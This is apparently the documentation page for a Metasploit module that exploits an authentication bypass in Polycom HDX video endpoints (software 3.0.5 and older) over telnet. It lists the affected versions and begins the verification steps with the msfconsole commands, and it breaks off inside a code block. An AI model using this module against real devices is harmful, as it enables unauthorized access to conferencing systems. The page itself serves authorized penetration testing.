## Vulnerable Application

This module exploits the Polycom HDX video endpoints with software <= 3.0.5.
It was tested on a Polycom HDX 7000 running software version 3.0.3. Telnet port
23 should be accessible, as it is with the factory default configuration.

## Verification Steps

A successful check of the exploit will look like this:

```
msf exploit(psh_auth_bypass) > use exploit/unix/misc/psh_auth_bypass
msf exploit(psh_auth_bypass) > run
